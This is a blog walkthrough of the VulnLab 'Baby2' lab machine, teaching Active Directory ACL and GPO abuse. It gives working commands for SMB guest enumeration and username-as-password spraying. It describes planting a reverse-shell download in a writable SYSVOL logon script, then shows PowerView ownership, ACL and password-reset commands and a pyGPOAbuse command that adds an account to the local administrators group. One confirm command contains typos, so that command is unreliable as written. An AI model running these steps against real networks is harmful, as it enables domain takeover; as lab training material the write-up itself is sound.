---
layout: post
title: VulnLab - Baby2 Walkthrough
date: 16-04-2025
categories: [Machines]
tags: [misconfigurations, ACLs, GPOs, smb, guest]
image: "https://assets.vulnlab.com/baby2_slide.png"
---

## Introduction

Welcome back to my Active Directory exploitation series from VulnLab! In the previous post, we explored “Baby”, a beginner-friendly Windows machine that introduced key AD fundamentals like LDAP enumeration and abusing SeBackupPrivilege for privilege escalation.

Today, we’re stepping things up with the second lab in the series — “Baby2”.

Baby2 is a solo, intermediate-level Windows Active Directory machine that dives deeper into AD misconfigurations, with a strong focus on Access Control Lists (ACLs) and Group Policy Objects (GPOs). These are common real-world components of Active Directory environments, and understanding how to identify and abuse misconfigurations around them is crucial for any Pentration Tester or Red Teamer.

> By the end of this lab, you’ll have hands-on experience with:
>- Identifying misconfigured ACLs on domain objects
>- Leveraging GPO-based privilege escalation 
{: .prompt-tip }

### Understanding the Concepts
Before jumping into the exploitation phase, let’s break down the two main concepts this lab focuses on — `Access Control Lists (ACLs)` and `Group Policy Objects (GPOs)` in a beginner-friendly way.

**Access Control Lists (ACLs)**
> An `Access Control List (ACL)` in Active Directory is essentially a set of permissions attached to an object, think of it as a list of `who can do what`. For example, imagine a shared folder in an office: 
>- Alice might have permission to read files, Bob can edit them, and Charlie has full control, including read, write, and delete access. 
>- Similarly, in Active Directory, ACLs define who can access, modify, or take control of objects like user accounts, groups, or computers. 
{: .prompt-tip }

**Group Policy Objects (GPOs)**
> `GPOs` are a way for administrators to automate system settings across all machines in a domain sort of like pushing rules or configurations to every computer.Example: Enforcing a password policy (e.g., must be 12 characters long), Running a startup script on all domain-joined PCs, Disabling USB drives across the organization.
{: .prompt-tip }

> A `startup script` is a script (usually a batch file, PowerShell script, or executable) that runs automatically when a computer starts up, before any user logs in. In the context of Windows Active Directory, startup scripts are often deployed using Group Policy Objects (GPOs) to enforce system-wide behavior across multiple machines.Let’s say an IT admin wants every company laptop to Map a network drive, Install software updates, Run a security scan.
{: .prompt-tip }

>GPOs are powerful — but if misconfigured, they can be exploited. For instance, if a user or group has write access to a GPO that applies to an admin's machine, the attacker can inject a malicious script or command that runs with higher privileges.
{: .prompt-tip }

>Now that we have a clear understanding of what `ACLs` and `GPOs` are and why misconfigurations in these areas can pose serious security risks let’s dive into the lab and start the enumeration and exploitation process step by step.


## Scanning
```bash
nmap -Pn -T4 -sC -sV  -p53,88,135,139,389,445,464,593,636,3389,5985,9389,49664,49667,49669,49674,49676,63798,63782,63775  10.10.83.184 -oN reports/all_tcp.txt
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 01:33 EAT
Nmap scan report for 10.10.83.184 (10.10.83.184)
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-13 22:34:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.baby2.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.baby2.vl
| Not valid before: 2025-04-13T21:30:57
|_Not valid after:  2026-04-13T21:30:57
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-04-13T22:34:55+00:00
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-04-12T21:39:46
|_Not valid after:  2025-10-12T21:39:46
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
63775/tcp open  msrpc         Microsoft Windows RPC
63782/tcp open  msrpc         Microsoft Windows RPC
63798/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-13T22:34:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.82 seconds

```

## Enumeration

### SMB
We kick off our enumeration with `SMB`, a common file-sharing protocol in Windows environments. It’s often a good first step when targeting Windows machines, especially in Active Directory. Using the `NetExec` tool we tried authenticating as the Guest user a default account that sometimes has limited access.The authentication was successful, and we were able to enumerate SMB shares on the target. Notably, we had read access to shares like `homes` and `apps`.

```bash
nxc smb 10.10.83.184 -u 'Guest' -p '' --shares
```

![alt text](/assets/screenshots/baby2/1.png)

Digging deeper into the accessible shares, I focused on the homes share. As expected in many AD environments, this share contained home directories for individual users — essentially their personal folders on the domain.

By listing the contents of this share, I was able to enumerate several valid usernames, which is a critical step when working in an Active Directory environment. These usernames will later come in handy for targeted enumeration or potential attacks like password spraying.

![alt text](/assets/screenshots/baby2/2.png)

**Username as Password**
With our list of usernames gathered from the homes share, we moved on to testing a common misconfiguration users setting their password to match their username.
We used NetExec again, leveraging its `--no-bruteforce` flag to ensure we’re not hammering accounts and risking lockouts.

This approach paid off — we successfully authenticated with two sets of credentials, `Carl.Moore:Carl.Moore` and `library:library`

```bash
nxc smb 10.10.68.173 -u loots/users.txt -p loots/users.txt --continue-on-success --no-bruteforce
```

![alt text](/assets/screenshots/baby2/3.png)


Enumerating Users

```bash
nxc smb 10.10.68.173 -u Carl.Moore -p Carl.Moore --users
```

![alt text](/assets/screenshots/baby2/4.png)

### Enumerating the Domain with BloodHound
Now that we’ve obtained valid credentials (`Carl.Moore:Carl.Moore`), it’s a great time to collect domain information using `BloodHound`, a powerful tool for visualizing and analyzing Active Directory relationships and privilege escalation paths.

We used `bloodhound-python` to perform a full collection of data from the domain.With the data imported into BloodHound, we’re ready to start analyzing our attack paths and identifying misconfigurations that can lead us to domain dominance.

```bash
bloodhound-python -d baby2.vl  -c all -u 'Carl.Moore' -p 'Carl.Moore' -ns 10.10.68.173 --zip
```

![alt text](/assets/screenshots/baby2/5.png)

While reviewing the BloodHound data, we identified that the user AMELIA.GRIFFITHS has a `logon script` (*a script that runs automatically when a user logs into a Windows domain.*) configured `\\baby2.vl\SYSVOL\baby2.vl\scripts\login.vbs`.This script is located in the `SYSVOL` share — a shared folder used by domain controllers to store public domain-wide resources, including `Group Policy scripts`. 

![alt text](/assets/screenshots/baby2/6.png)

>The key point here is if this script is writable by low-privileged users, it could be used as a method of privilege escalation.Since logon scripts are executed automatically when a user logs in, modifying a script tied to a privileged user could lead to code execution as that user
{: .prompt-tip }

## Initial Access
We accessed the SYSVOL share to inspect the logon script and found `login.vbs` inside the scripts directory. 

![alt text](/assets/screenshots/baby2/17.png)

After downloading it locally, we analyzed its contents and modified it to include a malicious payload:
This payload uses PowerShell to download and execute a reverse shell from our attacker-controlled machine. 

![alt text](/assets/screenshots/baby2/7.png)

### Abusing Logon Script
Before proceeding, we deleted the original login.vbs from the share to confirm write access. Once confirmed, we uploaded our modified version successfully.

![alt text](/assets/screenshots/baby2/8.png)

Meanwhile, we had already set up a `Python HTTP server` to host `notpad.ps1` (a PowerShell reverse shell script) and a Netcat listener to catch the connection. As soon as a user triggered the logon script, we received a reverse shell confirming successful exploitation of a writable `logon script via GPO misconfiguration`. To confirm which user the reverse shell was running as, we executed the following PowerShell command, which is similar to whoami `"$env:USERDOMAIN\$env:USERNAME"`

![alt text](/assets/screenshots/baby2/9.png)

## Privilege Escalation
Back in BloodHound, we discovered that `AMELIA.GRIFFITHS` is a member of the `LEGACY@BABY2.VL` group. According to the analysis, members of this group have the `WriteDACL` permission on the user `GPOADM@BABY2.VL`.

### writeDACL
>In Active Directory, every object (like a user, group, or computer) has a set of permissions that control who can do what to it. These permissions are stored in something called a DACL (Discretionary Access Control List). The WriteDACL permission means you can edit that list of permissions.
{: .prompt-tip }

>Imagine a VIP room that has a guest list at the door only people on the list can get in.Normally, only the manager can edit the guest list.But if you have WriteDACL, it's like having the power to walk up and add your name (or your friend’s name) to the VIP list.
{: .prompt-tip }

>In Active Directory terms, If you have `WriteDACL` over a user account like `GPOADM`, you can add your own account and give it full control over `GPOADM`. From there, you can do things like: Reset their password Or even impersonate them completely.
{: .prompt-tip }


![alt text](/assets/screenshots/baby2/10.png)

```powershell
Import-Module .\PowerView.ps1
```

```powershell
Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
```

Confirm

```powershell
Get-ADUser gpoadmin | ForEach-Object {Get-ACL "AD:\$($_.DistingishedNam)" | Select-Object -ExpandProperty Owner}
```

All ACL

```powershell
Add-DomainObjectAcl -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All
```

Change Password

```powershell
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
```

```powershell
Set-DomainUserPassword -Identity 'gpoadm' -AccountPassword $NewPassword
```

Finally

```powershell
nxc smb 10.10.70.158 -u gpoadm -p 'Password1234'
```

![alt text](/assets/screenshots/baby2/11.png)

### GPO Abuse

![alt text](/assets/screenshots/baby2/12.png)

GPO Path

![alt text](/assets/screenshots/baby2/13.png)

Abuse GPO

```powershell
python3 pygpoabuse.py 'baby2.vl/gpoadm:Password1234' -gpo-id "6AC1786C-016F-11D2-945F-00C04FB984F9" -command "net localgroup administrators gpoadm /add" -f
```

```powershell
gpupdate /force
```

![alt text](/assets/screenshots/baby2/14.png)

Dump Secrets

![alt text](/assets/screenshots/baby2/15.png)

Root

![alt text](/assets/screenshots/baby2/16.png)

## References

[NetExec Cheatsheet](https://seriotonctf.github.io/2024/03/07/CrackMapExec-and-NetExec-Cheat-Sheet/)

[Logon script | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/logon-script)

[Abusing AD-DACL: WriteDacl - Hacking Articles](https://www.hackingarticles.in/abusing-ad-dacl-writedacl/)

https://github.com/Hackndo/pyGPOAbuse